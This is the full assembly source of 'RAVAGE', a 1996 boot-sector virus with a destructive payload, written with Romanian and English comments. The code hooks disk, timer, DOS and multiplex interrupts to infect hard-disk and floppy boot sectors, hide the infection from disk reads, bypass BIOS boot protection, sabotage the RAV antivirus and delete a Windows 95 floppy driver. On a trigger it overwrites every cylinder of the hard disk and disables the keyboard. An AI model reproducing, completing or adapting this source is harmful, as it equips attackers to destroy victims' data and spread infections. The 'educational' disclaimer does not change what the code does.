;      RAVAGE BSV   Written by RP & muRPhy  October 1996
; 	version 9.0 [ New Generation ] -- WIN95 compatible :-)
;
;Replicator module (c) 1994-96 RP, Bucharest
;Tips & tricks (c) 1995-96 muRPhy, Bucharest
;Final version full options Warning!!! Distructive sequence included!

;This source code is for educational purposes only. The author is not
;responsible for any problems caused due to the assembly of this file"


.286
code segment
assume cs:code
org 100h
start:
q db 7b00h dup(90h)
timer equ 08h

	jmp begin
bootrecord  db 32 dup(0) ;min=32


;............. Entry point ..............................
begin:
	push cs
	
	mov di,414h;		steal 1k of RAM
	pop ds
	mov byte ptr ds:[04a1h],0eah ;pun cod de jmp xxxx:xxxx pt INT 40H
	dec di			     ;added code for jmp xxxx:xxxx for INT 40H
	dec ds:word ptr[di]
	mov ax,ds:word ptr[di]
	shl ax,6	;only >80186
	sub ax,07c0h
	push ax
	push ax
;.......................................................
	mov ax,0201h; read the other sector of the virus
	push cs
	pop es
	mov bx,7e00h
	mov cx,000fh
cxpar equ this word
	mov dx,0080h
dxpar equ this word
	int 13h

	mov word ptr ds:[offset temp-2],609Ch	;refac cod de pushf pusha
						;restoring code for pushf pusha
;	mov bx,0100h		;get original INT 40H
	mov bh,01		;bl already 00 from bx=7e00
	les ax,[bx]
	mov ds:[int40seg],es	;store original INT 40H
	mov ds:[int40ofs],ax
	
;.......................................................
	pop ax
	mov bx,04a2h		;prepare code at 0:4a1h for jmp xxxx:xxxx
	mov [bx],offset int40
	mov word ptr [bx+02],ax

	mov bx,004ch; get & corrupt int 13h
	xchg ds:[bx+2],ax
	mov ds:[int13seg],ax
	mov ax,offset int13
	xchg ds:[bx],ax
	mov ds:[int13ofs],ax
;.......................................................
	pop es
	mov si,7c00h;		transfer virus code
	mov di,si
	cld
	xor cx,cx
	mov ch,02	;anti TBAV flag O
	rep movsw

	cli
	mov ax,es	;get & corrupt INT 08H
;	mov bx,timer*4
	mov bl,timer*4 ;bh already 00 from bx=004ch
	xchg ds:[bx+2],ax
	mov es:[int08seg],ax
	mov ax,offset int08
	xchg ds:[bx],ax
	mov es:[int08ofs],ax

	mov ax,0201h	; fast boot infector sequence
	mov dx,0080h
	inc cx
	int 13h

	call testziuaz ; is it trash day ?
	cmp dx,0303h
ziuaz equ this word
	jnz boot
	
	jmp entry
boot:	
	int 19h
;------------------- int 40h

jmpint40:
	 db 0eah
int40ofs dw 0
int40seg dw 0

;----------------- Corrupted entry in INT 40H
int40:
	cmp ah,02h
	jnz jmpint40
	cmp cx,0001
	jnz jmpint40
	or dh,dh
	jnz jmpint40
	call disketa
	jmp short verificare


;................. jmp int 13 ............................
jmpint13:
	db 0eah; jmp xxxx:xxxx
int13ofs dw 0
int13seg dw 0
;...........................................................
cmp03:
	cmp ah,03
	jne jmpint13
	cmp dl,80h
	jb jmpint13
	jmp short contcmp


;...........................................................

int13:		; FAR PROCEDURE FOR HANDLING INTERRUPT 13H
	cmp ah,02h
	jnz cmp03
;---
	cmp dl,80h	;pe HDD
	jb contcmp
	or dh,dh	;head 0?
	jnz contcmp
	cmp cx,000eh	;se redirecteaza 14 si 15 pe 13  presupus cu zerouri 
	jz fak			;sau cu orice altceva
	cmp cx,000fh	;show instead of sectors 14 and 15 , sector 13
	jnz contcmp	;sector 13 supposed zeroed or whatever
			;not quite good implemented but works anyway
fak:
	mov cl,0dh
	jmp jmpint13
;---
contcmp:
	cmp cx,0001
	jnz jmpint13
	or dh,dh;  <=> cmp dh,00
	jnz jmpint13

	cmp dl,80h
	jae hard
	call disketa
	jmp short verificare
hard:
	call callint13;		it was requested a read action for the boot
verificare:
	jc giveup
	cmp es:word ptr[bx+1bch],0202h;		is it infected?
	jz showboot
	call compute
	mov ax,0301h; 	write real boot on computed sector
	call callint13
	jnc continue
clearerr:
	clc
giveup:
	retf 0002
showboot:
	call compute
	mov ax,0201h
	call callint13
	jmp short giveup
;-------------------------
continue:
	push es
	push bx
	push cs
	pop es
	mov ax,0301h;	write the other sector of the virus
	inc cx	 	
	mov cs:[offset cxpar-2],cx
	mov cs:[offset dxpar-2],dx
	mov bx,7e00h
	call callint13
	pop bx
	pop es
	jc clearerr

	push es
	push bx
	push ds
	push si
	push di

	push es
	pop ds
	push cs
	pop es

	mov si,bx
	add si,1beh;		copy the partition into the virus code
	mov di,7dbeh
	mov cl,21h
	cld
	rep movsw
	mov si,bx;		copy the boot record into the virus code
	add si,3
	mov di,7c03h
	mov cl,16
	rep movsw


	cmp dl,80h
	jb normal

;-----
	pusha

	mov ah,05;	bypass BIOS protection;place Y into keyboard buffer.
	mov cl,59h
	int 16h
	call resetcmosflag
	inc cs:word ptr [counter]
	call testziuaz
	mov al,dh
	cmp al,09h
	ja maimare		;"maimare " means "greater than"
	add al,12h		;in Romanian language, of course...
	daa
maimare:
	sub al,09h
	das
	mov dh,al
	mov cs:word ptr [offset ziuaz-2],dx

	popa
;-----

normal:
	inc cx		;salvez  cx=0000 cu pusha dupa rep movsw =>cx=0001
			;cx=0000 saved by pusha after rep movsw =>cx=0001
iar:
	mov ax,0301h;		write the virus onto the disk
	mov bx,7c00h
	xor dh,dh
	call callint13
	jc iar
	call resetkeyboard
afar:
	pop di
	pop si
	pop ds
	pop bx
	pop es
	jmp  giveup

disketa:
	pushf
	call cs:dword ptr [int40ofs]
	ret



counter dw 0
virsign dw 0202h
partition1 db 80h,01h,01,00,06,0eh,201,231,11h,0,0,0,07,228,03,00
			;take care (this is my partition)
			;you'll have to change this with yours
db 30h dup (0)			
db 55h,0aah

;............  Second sector  ..............................

int2f:		;FAR PROCEDURE FOR HANDLING INTERRUPT 2FH
	pushf
	pusha 
	push ds
	push es

	xor bx,bx
	mov ds,bx
	mov bx,07b4h
	cmp ax,1605h	;is it Init Windows ?
	jne cont2f
	mov ax,cs:[int13ofs]	;restore original handler of INT 13H
	mov ds:[bx],ax
	mov ds:[bx+0806h-07b4h],ax
	mov ax,cs:[int13seg]
	mov ds:[bx+2],ax
	mov ds:[bx+2+0806h-07b4h],ax

	mov ah,62h		;Get Active PSP segment
	int 21h
	mov ds,bx
	mov ax,ds:[002ch]	;Get environment segment
	mov es,ax
	xor di,di
	cld
	mov cx,0050h
	mov al,'o'
	repnz scasb
	cmp es:[di],'to'	; winbootdir?
	jnz jmpint2f

	add di,+06
	push es
	pop ds
	mov dl,ds:[di]
	sub dl,'C'-2
	mov ah,0eh
	int 21h

	push di
	pop dx
	mov ah,3bh		;Change Directory to folder of WIN95
	int 21h			;
				;     apelul windows de genul:
				; win setup.exe nu se va realiza cum trebuie
				;
				;I guess if someone'll run something like
				;win setup.exe worse things'll happen
				;doesn't matter anyway (few of them will
				;run win in this way)
	push cs	
	pop ds
	mov ah,41h		; Unlink ds:dx
	mov dx,offset floppydriver
	int 21h			;ideal ar fi sa nu dea eroare AX=1606h
				;here I suppose AX will differ from 1606h
				;more than that...I'm sure AX <> 1606h
cont2f:
	cmp ax,1606h		;is it Exit Windows?
	jne jmpint2f
	mov ax,offset int13	;corrupt again handler of INT 13H
	mov ds:[bx],ax
	mov ds:[bx+0806h-07b4h],ax
	mov ds:[bx+2],cs
	mov ds:[bx+2+0806h-07b4h],cs

	cmp byte ptr ds:[04a6h],0DAH ;is flag set ?
	jz entry

jmpint2f:
	pop es
	pop ds
	popa
	popf
	db 0eah; jmp xxxx:xxxx
int2fofs dw 0
int2fseg dw 0
;----------------------------------
entry:
	push cs
	pop ds
	mov si,offset txt-1
video:
		mov ax,0010h
		int 10h
		mov ah,0eh
		mov bl,0ah	
repeta:
		std
		lodsb 
		cmp al,'$'
		jz distroi
		int 10h
		jmp short repeta
distroi:
	mov cx,0001h
destroyagain:
		mov ax,030eh
		mov dx,0180h
		call callint13	
		call resetcmosflag
		in al,21h 	;disable keyboard
		or al,02
		out 21h,al

		inc ch
		jnz destroyagain	;
		add cl,40h		;for all existing cylinders > 256
		jmp short destroyagain


;..........................INT 21H
int21:
	pushf
	pusha
	push ds
	push es
	mov di,dx
	xor ah,4bh
	jnz oldint21
	push ds
	pop es
	xor al,al
	cld
	mov cl,0ffh
	repnz scasb
	std
	mov al,'\'
	repnz scasb
	mov ax,ds:[di+02]
	and ax,0dfdfh
	cmp ax,'AR'
	jnz oldint21
	mov ah,ds:[di+04]
	and ah,0dfh
	cmp ah,'V'
	jnz oldint21
	mov al,01
	out 70h,al
	in al,71h
	cmp al,126	;max value for counter
	jne ravnormal
	
	mov ax,1600h	;checking Win active
	int 2fh
	or al,al
	jz entry	;al=0 means Win not active
	xor ax,ax
	mov ds,ax
	mov byte ptr ds:[04a6h],0DAh	;set flag on low memory
	jmp short oldint21



;------------------------
ravnormal:	
	inc ax
	push ax
	mov al,01
	out 70h,al
	pop ax
	out 71h,al
oldint21:
	pop es
	pop ds
	popa
	popf
db 0eah; JMP xxxx:xxxx
int21ofs dw 0
int21seg dw 0
;...............   INT 08H .......................................
int08:
	pushf
	pusha
temp equ this word
	push es
	push ds
	xor di,di		;DI=0000h
	mov ds,di		;DS=0000h
	mov ax,0b8ah
	mov es,ax
	cld
	mov ax,'EP'
	mov cx,0ffffh			;"cautare" means "searching"
					;for those of you who don't speak
					; Romanian language ;-)
cautare:
	repnz scasw
	or cx,cx
	jz notyet
	cmp es:[di],'=C'
	jnz cautare

	push cs
	pop ax		; ax =residseg
	mov di,02fh*4			;Save segment INT 2Fh
	xchg [di+02],ax			;Corrupt segment 2FH
	mov cs:[int2fseg],ax

	mov ax,offset int2f		;Save & corrupt offset INT 2FH
	xchg [di],ax
	mov cs:[int2fofs],ax

	push cs
	pop ax
	mov di,021h*4			;Save segment INT 21h
	xchg [di+02],ax			;Corrupt segment 21H
	mov cs:[int21seg],ax

	mov ax,offset int21		;Save & corrupt offset INT 21H
	xchg [di],ax
	mov cs:[int21ofs],ax


				;Command.com alocat
	inc word ptr ds:[0413h]	;refac la 0:413h
				;restoring 0:413h
	mov bx,0100h
	mov word ptr ds:[bx],04a1h	;corrupt INT 40 to point 0:04a1h
	mov word ptr ds:[bx+02],0	;to a jmp far code 

	

   mov word ptr cs:[offset temp-2],[(offset peste)-(offset temp)] shl 8+ 0ebh
	; dezactiveaza rutina de pe system timer (INT 08H)
	; disabling (handler) routine for INT 08H
notyet:
	pop ds
	pop es
	popa
	popf
peste equ this word
	db 0eah
int08ofs dw 0
int08seg dw 0


floppydriver db 'system\iosubsys\hsflop.pdr',0

testziuaz:
	mov ah,04
	int 1ah
	cmp dl,28h
	jbe nochange
	mov dl,28h
nochange:
	ret



callint13:
	pushf
	call cs:dword ptr[int13ofs]
	ret

resetcmosflag:
	mov al,01		
	out 70h,al
	mov al,100	;set counter in CMOS for RAV
	out 71h,al	; RAV stands for Romanian AntiVirus
	ret		;an AV prog from ROMANIA


compute:
	mov cl,14
	cmp dl,80h
	jae back
	mov dh,1
	mov al,es:byte ptr[bx+15h]
	cmp al,240; f0h	 1.44 disk
	je back
	mov cl,3
back:
	ret
resetkeyboard:
	cmp dl,80h
	jb nu
	xor bx,bx
	mov ds,bx
	mov bl,1eh
	mov ds:[041ah],bx
	mov ds:[041ch],bx
nu:
	ret
;        '$RAVage is wiping data! RP&muRPhy '
text db '$yhPRum&PR  !atad gnipiw si egaVAR'
txt equ this word
code ends
end start
								    muRPhy (c)96
